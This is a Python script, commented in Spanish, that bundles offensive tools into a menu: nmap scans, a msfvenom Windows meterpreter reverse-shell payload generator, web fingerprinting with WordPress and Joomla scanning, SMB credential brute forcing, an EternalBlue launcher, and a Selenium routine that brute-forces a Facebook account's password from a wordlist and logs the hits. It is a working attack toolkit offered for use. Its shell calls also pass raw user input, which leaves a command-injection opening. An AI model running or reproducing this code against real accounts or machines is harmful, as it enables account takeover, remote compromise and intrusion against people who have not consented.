import os
import time

from selenium import webdriver

os.system("clear")

ruta = os.getcwd() + "/output/"

def msfvenom(lhost,lport,nombre):
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " -f exe > " + ruta + nombre + ".exe")

def nmap(direccion):
    os.system("nmap -O -oX - "+ direccion + ">" + ruta + direccion + ".xml")

def smb(ip):
    print("Recuarde que tiene que abrir el archivo smb_usuario.txt y smb_clave.txt para colocar las credenciales\n")
    input("Si ya tiene esta lista con las contraseñas y usuarios presione una tecla, si no, aun esta a tiempo de colocarlas ")

    os.system("./acccheck.pl -U smb_usuario.txt -P smb_clave.txt -t " + ip )

def informacionWeb(direccion):
    os.system("whatweb -v -a 3 " + direccion + " > " + ruta + direccion + "_whatweb" + ".txt")
    os.system("sslscan " + direccion + " > " + ruta + direccion + "_sslscan" + ".txt")

    palabra = "WordPress"
    f = open(ruta + direccion + "_whatweb.txt")
    libro = f.read()
    n = libro.count(palabra)
    f.close()

    if n >= 1:
        os.system("wpscan --url " + direccion + " -o " + ruta + direccion + "_wordpress" + ".txt")

    palabra = "Joomla"
    f = open(ruta + direccion + "_whatweb.txt")
    libro = f.read()
    n = libro.count(palabra)
    f.close()

    if n >= 1:
        os.system("joomscan -u " + direccion + " > " + ruta + direccion + "_joomla" + ".txt")

def facebookPassword():

    print("Recuarde que tiene que abrir el archivo claves_facebook.txt y colocar las contraseñas una debajo de la otra\n")
    input("Si ya tiene esta lista con las contraseñas presione una tecla, si no, aun esta a tiempo de colocarlas ")

    #Verificamos que la lista de calves exista
    try:
        diccionario_claves = open('claves_facebook.txt', 'r') #Abrimos el archivo

    except:
            print("\n No se encontro la lista de las claves")
            time.sleep(2)
            return

    #Definimos el correo al cual se le probaran las claves
    usuario = input("Dijite el correo electronico: ")

    #Definimos la variable del webdriver y la ruta donde este se encuentra
    driver = webdriver.Firefox()

    #Asignamos variables tanto para las claves
    #Leemos linea por linea del archivo 
    clave = diccionario_claves.readline()

    #Abrimos un navegador y accedemos a la pagina de facebook
    driver.get("https://www.facebook.com/login")
    time.sleep(2)

    #Nos aseguramos que sea la pagina de facebook verificando el titulo
    assert "Facebook" in driver.title

    #Definimos la funciona para realizar el proceso de login y cerrar sesion

    def facebook():
        time.sleep(2)

        #Inicio bloque de codigo para ingresar el correo en el campo de correo
        box_usuario = driver.find_element_by_id("email")
        box_usuario.clear()
        box_usuario.send_keys(usuario)
        print("\n Usuario ingresado")
        time.sleep(2)
        #Fin bloque correo

        #Inicio bloque de codigo para ingresar la clave
        box_clave = driver.find_element_by_id("pass")
        box_clave.clear()
        box_clave.send_keys(clave.strip())
        print("\n clave ingresada")
        time.sleep(2)
        #Fin bloque correo

        #Boton para iniciar sesion
        box_entrar = driver.find_element_by_id("loginbutton").click()

        #Capturamos la url para comprobar que la cuenta si inicio sesion
        url_actual = driver.current_url

        if url_actual == "https://www.facebook.com/":
            print("\n Clave Encontrada")

            #Se procede a habrir un archivo para colocar las cuentas procesadas las que funcionan
            f = open(ruta + "cuentas_procesadas_facebook.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (Funciona)\n")
            f.close()
            driver.quit() #cerrar el navegador
            time.sleep(2)
            return

        else:
            #Si la cuenta no funciona de vuelve a cargar el login
            driver.get("http://www.facebook.com/login")

            #Se procede a Abrir un archivo para colocar las cuentas procesadas las que no funcionan
            f = open(ruta + "cuentas_procesadas_facebook.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (No Funciona)\n")
            f.close()

            time.sleep(4)
            return

    #Utilizamos en ciclo while para parar el codigo cuando no queden cuentas por comprobar
    #Y no repetir los que ya se procesaron
    while clave != "":
        facebook()
        clave = diccionario_claves.readline()

    driver.quit() #cerrar el navegador


def eternal_blue():
    print("RECUERDE QUE DEBE DRIGIRSE AL ARCHIVO eternal.rc PARA CAMBIAR EL LHOST Y RHOST \n ")
    print("RECUERDE QUE ESTE EXPLOIT SOLO FUNCIONARA CON WINDOWS 7 x64 \n ")     
    input("presione para continuar ")
    os.system("msfconsole -r eternal.rc")

def menu():
    os.system('clear')
    print("  _   _    _    ____ _  _______ ____      _____    _    ____ __   __          _   ___") 
    print(" | | | |  / \  / ___| |/ / ____|  _ \    | ____|  / \  / ___ \ \ / / __   __ / | / _ \ ") 
    print(" | |_| | / _ \| |   | ' /|  _| | |_) |   |  _|   / _ \ \___ \ \ V /  \ \ / / | || | | |") 
    print(" |  _  |/ ___ \ |___| . \| |___|  _ <    | |___ / ___ \ ___) | | |    \ V /  | || |_| |") 
    print(" |_| |_/_/   \_\____|_|\_\_____|_| \_\___|_____/_/   \_\____/  |_|     \_/___|_(_)___/ ") 
    print("                                    |_____|                            |_____|      ") 
    print("Selecionar una opcion")
    print("\t1) escaneo nmap xml")
    print("\t2) crear playload")
    print("\t3) informacion de la pagina")
    print("\t4) Fuerza bruta facebook")
    print("\t5) Fuerza bruta PC SMB")
    print("\t6) Eternal blue")
    print("\t7) salir")

while True:
    menu()

    opcionMenu = input("\x1b[3;33m" + "Ingresar una opcion >> ")

    if opcionMenu == '1':

        direccion = input("\033[3;36m" + "Ingresar la direccion a escanear >> ")
        nmap(direccion)

    elif opcionMenu == '2':

        lhost = input("\033[;31m" + "Ingresar LHOST >> ")
        lport = input("\033[;31m" + "Ingresar LPORT >> ")
        nombre = input("\033[;31m" + "Ingresar nombre >> ")
        msfvenom(lhost,lport,nombre)

    elif opcionMenu == '3':

        direccion = input("\033[;32m" + "Ingresar web >> ")
        informacionWeb(direccion)

    elif opcionMenu == '4':
        facebookPassword()

    elif opcionMenu == '5':
        ip = input("\033[;32m" + "Ingresar Ip >> ")
        smb(ip)

    elif opcionMenu == '6':
         eternal_blue()

    elif opcionMenu == '7':
        break

